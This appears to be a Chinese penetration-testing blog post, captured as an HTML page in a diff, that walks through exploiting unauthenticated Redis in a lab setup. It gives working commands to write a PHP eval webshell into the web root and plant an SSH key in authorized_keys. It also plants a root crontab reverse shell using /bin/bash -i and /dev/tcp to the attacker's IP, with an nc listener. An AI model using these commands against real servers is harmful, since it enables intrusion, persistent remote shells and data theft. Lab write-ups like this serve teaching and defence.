@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>redis未授权访问漏洞利用 | Damit5&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="damit5" />
+  
+  
+  
+  
+  <meta name="description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer0&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://dam">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis未授权访问漏洞利用">
+<meta property="og:url" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/index.html">
+<meta property="og:site_name" content="Damit5&#39;s Blog">
+<meta property="og:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer0&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://dam">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/1.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/2.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/3.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/4.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/5.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/6.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/7.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/8.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/9.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/10.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/11.png">
+<meta property="og:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/12.png">
+<meta property="og:updated_time" content="2018-05-18T03:35:47.220Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Redis未授权访问漏洞利用">
+<meta name="twitter:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer0&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://dam">
+<meta name="twitter:image" content="https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/img/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/favicon.png">
+  <link rel="apple-touch-icon" href="/css/images/favicon.png">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/favicon.png">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/About">About</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/Link">link</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="index.search"><button type="submit" class="search-form-submit"> </button><input type="hidden" name="sitesearch" value="https://damit5.com"></form>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Redis未授权访问漏洞利用" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Redis未授权访问漏洞利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/05/18/Redis未授权访问漏洞利用/" class="article-date">
+	  <time datetime="2018-05-18T03:30:00.000Z" itemprop="datePublished">2018-05-18</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer0"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "六月的雨",
+					author: "胡歌",
+					url: "https://damit5.github.io/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
+					pic: "https://damit5.github.io/Music/233.jpg",
+				}
+			});
+		</script>
+<h2 id="0x00-危害"><a href="#0x00-危害" class="headerlink" title="0x00 危害"></a>0x00 危害</h2><p><strong>信息泄露</strong></p>
+<ul>
+<li>系统信息</li>
+<li>redis保存的信息</li>
+</ul>
+<p><strong>GetShell</strong></p>
+<ul>
+<li>在Web目录中写入webshell</li>
+<li>写入SSH公钥直接连接</li>
+<li>写入计划任务(corntab)反弹shell</li>
+</ul>
+<a id="more"></a>
+<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><table>
+<thead>
+<tr>
+<th>鸡型</th>
+<th>ip</th>
+<th>服务</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>攻击鸡</td>
+<td>192.168.1.100</td>
+<td>Windows</td>
+<td>10</td>
+</tr>
+<tr>
+<td>攻击鸡</td>
+<td>192.168.1.100</td>
+<td>redis-cli</td>
+<td>3.0.501</td>
+</tr>
+<tr>
+<td>受害鸡</td>
+<td>192.168.1.105</td>
+<td>Ubuntu</td>
+<td>16.04 LTS</td>
+</tr>
+<tr>
+<td>受害鸡</td>
+<td>192.168.1.105</td>
+<td>redis-server</td>
+<td>3.0.6</td>
+</tr>
+<tr>
+<td>受害鸡</td>
+<td>192.168.1.105</td>
+<td>Apache</td>
+<td>2.4.18 (Ubuntu)</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>因为新版的 redis 默认绑定的地址为 <code>127.0.0.1</code>，所以为了复现漏洞，我们将绑定端口改成<code>0.0.0.0</code></li>
+</ul>
+<p><code>sudo vim redis.conf</code></p>
+<p>将 <code>69</code> 行的 <code>127.0.0.1</code> 修改为 <code>0.0.0.0</code></p>
+<p><img src="img/1.png" alt="change_bind_ip"></p>
+<ul>
+<li>启动redis必须使用 root 权限启动，否则<code>save</code>时会报错</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 关闭 redis 服务</div><div class="line">sudo service redis-server stop</div><div class="line"># 打开 redis 服务</div><div class="line">cd /usr/bin/ &amp;&amp; sudo redis-server</div></pre></td></tr></table></figure>
+<h2 id="0x02-信息泄露"><a href="#0x02-信息泄露" class="headerlink" title="0x02 信息泄露"></a>0x02 信息泄露</h2><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><p><strong>获取所有的key值</strong> <code>keys *</code></p>
+<p>具体查看数据可以查看redis教程</p>
+<blockquote>
+<p><a href="http://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="external">http://www.runoob.com/redis/redis-tutorial.html</a></p>
+</blockquote>
+<p><img src="img/2.png" alt="get_keys"></p>
+<h3 id="系统信息泄露"><a href="#系统信息泄露" class="headerlink" title="系统信息泄露"></a>系统信息泄露</h3><p><code>info</code> 命令</p>
+<p>可以看到redis的版本、系统内核版本、配置文件路径等信息</p>
+<p><img src="img/3.png" alt="info"></p>
+<h2 id="0x03-GetShell"><a href="#0x03-GetShell" class="headerlink" title="0x03 GetShell"></a>0x03 GetShell</h2><h3 id="在Web目录中写入webshell"><a href="#在Web目录中写入webshell" class="headerlink" title="在Web目录中写入webshell"></a>在Web目录中写入webshell</h3><p><strong>前提条件</strong></p>
+<p>已知网站目录的绝对路径，并且具有读写权限</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><strong>启动apache服务器</strong></p>
+<p><code>sudo service apache2 start</code></p>
+<p><strong>查看apache服务器状态</strong></p>
+<p><code>sudo service apache2 status</code></p>
+<p>有一个 <strong>running</strong> 则说明在运行状态</p>
+<p><img src="img/4.png" alt="running"></p>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 写入一个string内容</div><div class="line">set shell &quot;&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;&quot;</div><div class="line"># 设置备份目录</div><div class="line">config set dir /var/www/html/</div><div class="line"># 设置备份文件名</div><div class="line">config set dbfilename shell.php</div><div class="line"># 保存文件到本地</div><div class="line">save</div></pre></td></tr></table></figure>
+<p><img src="img/5.png" alt="config"></p>
+<h5 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h5><p><img src="img/6.png" alt="Cknife"></p>
+<h3 id="写入SSH公钥直接连接"><a href="#写入SSH公钥直接连接" class="headerlink" title="写入SSH公钥直接连接"></a>写入SSH公钥直接连接</h3><ul>
+<li>本地生成公钥和私钥</li>
+<li>将公钥写入到目标的<code>.ssh</code>文件夹</li>
+<li>ssh 连接</li>
+</ul>
+<h4 id="在本地生成公钥和私钥"><a href="#在本地生成公钥和私钥" class="headerlink" title="在本地生成公钥和私钥"></a>在本地生成公钥和私钥</h4><p>PS : 这里为了方便，我直接从受害鸡里面生成的公钥和私钥，然后再将他们剪切到攻击鸡</p>
+<p><code>ssh-keygen -t rsa</code></p>
+<p><img src="img/7.png" alt="generate_ssh"></p>
+<p><img src="img/8.png" alt="cat_key"></p>
+<h4 id="将公钥写入文件中"><a href="#将公钥写入文件中" class="headerlink" title="将公钥写入文件中"></a>将公钥写入文件中</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># 备份文件目录设置为对应的 .ssh，部分为 /root/.ssh/</div><div class="line">config set dir /home/lynn/.ssh/</div><div class="line"></div><div class="line">config set dbfilename authorized_keys</div><div class="line"></div><div class="line"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</div><div class="line">set key &quot;\n\n\生成的公钥n\n&quot;</div><div class="line"></div><div class="line">save</div></pre></td></tr></table></figure>
+<p><img src="img/9.png" alt="cat_key"></p>
+<h4 id="ssh-连接"><a href="#ssh-连接" class="headerlink" title="ssh 连接"></a>ssh 连接</h4><p><code>ssh -i id_rsa lynn@192.168.1.105</code></p>
+<p><img src="img/10.png" alt="cat_key"></p>
+<p>可以看到不需要输入密码直接连接</p>
+<h3 id="写入计划任务-corntab-反弹shell"><a href="#写入计划任务-corntab-反弹shell" class="headerlink" title="写入计划任务(corntab)反弹shell"></a>写入计划任务(corntab)反弹shell</h3><p><strong>！注意！</strong></p>
+<p>这里有一个很深的坑，那就是</p>
+<p>crontab反弹debain,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行 </p>
+<p><code>crontab -u root /var/spool/cron/crontabs/root</code></p>
+<p>通过语法检查后，才能执行计划任务。</p>
+<p>因为这个坑，用了整整一天的时间来研究这个</p>
+<p>参考文章</p>
+<blockquote>
+<p><a href="http://www.freebuf.com/vuls/148758.html" target="_blank" rel="external">http://www.freebuf.com/vuls/148758.html</a></p>
+</blockquote>
+<p>主要是感谢下方的评论</p>
+<hr>
+<h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><p>和写入公钥一样，将文件保存到本地，备份文件名必须要和用户的名字一样，比如是 lsa 那么备份文件就是 lsa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.100/1234 0&gt;&amp;1\n\n&quot;</div><div class="line">config set dir /var/spool/cron/crontabs/</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure>
+<h4 id="攻击鸡开启监听"><a href="#攻击鸡开启监听" class="headerlink" title="攻击鸡开启监听"></a>攻击鸡开启监听</h4><p><code>nc -lvp 1234</code></p>
+<p><img src="img/11.png" alt="nc_1"></p>
+<h4 id="等待-1-分钟"><a href="#等待-1-分钟" class="headerlink" title="等待 1 分钟"></a>等待 1 分钟</h4><p>等待一分钟受害鸡即可执行任务，攻击鸡就可以收到shell</p>
+<p><img src="img/12.png" alt="nc_2"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>redis未授权访问总的来说危害还是挺大的</p>
+<p>但是实际过程中还是会遇到很多很多的问题</p>
+<p>比如</p>
+<ul>
+<li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li>
+<li>redis写入的时候就会覆盖passwd，而且passwd不能恢复</li>
+<li>debian,ubuntu 计划任务的限制很严格，写入成功是不能执行的</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/05/11/通过-sqli-labs-学习SQL注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">通过 sqli-labs 学习SQL注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-危害"><span class="nav-number">1.</span> <span class="nav-text">0x00 危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-环境"><span class="nav-number">2.</span> <span class="nav-text">0x01 环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-信息泄露"><span class="nav-number">3.</span> <span class="nav-text">0x02 信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据泄露"><span class="nav-number">3.1.</span> <span class="nav-text">数据泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统信息泄露"><span class="nav-number">3.2.</span> <span class="nav-text">系统信息泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-GetShell"><span class="nav-number">4.</span> <span class="nav-text">0x03 GetShell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#在Web目录中写入webshell"><span class="nav-number">4.1.</span> <span class="nav-text">在Web目录中写入webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#环境搭建"><span class="nav-number">4.1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">4.1.2.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#写入shell"><span class="nav-number">4.1.2.1.</span> <span class="nav-text">写入shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#菜刀连接"><span class="nav-number">4.1.2.2.</span> <span class="nav-text">菜刀连接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入SSH公钥直接连接"><span class="nav-number">4.2.</span> <span class="nav-text">写入SSH公钥直接连接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#在本地生成公钥和私钥"><span class="nav-number">4.2.1.</span> <span class="nav-text">在本地生成公钥和私钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#将公钥写入文件中"><span class="nav-number">4.2.2.</span> <span class="nav-text">将公钥写入文件中</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh-连接"><span class="nav-number">4.2.3.</span> <span class="nav-text">ssh 连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入计划任务-corntab-反弹shell"><span class="nav-number">4.3.</span> <span class="nav-text">写入计划任务(corntab)反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#执行命令"><span class="nav-number">4.3.1.</span> <span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击鸡开启监听"><span class="nav-number">4.3.2.</span> <span class="nav-text">攻击鸡开启监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#等待-1-分钟"><span class="nav-number">4.3.3.</span> <span class="nav-text">等待 1 分钟</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">5.</span> <span class="nav-text">0x04 总结</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 - 2018 Damit5&#39;s Blog All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/About" class="mobile-nav-link">About</a>
+  
+    <a href="/Link" class="mobile-nav-link">Link</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Damit5&#39;s Blog
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 Damit 5 All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
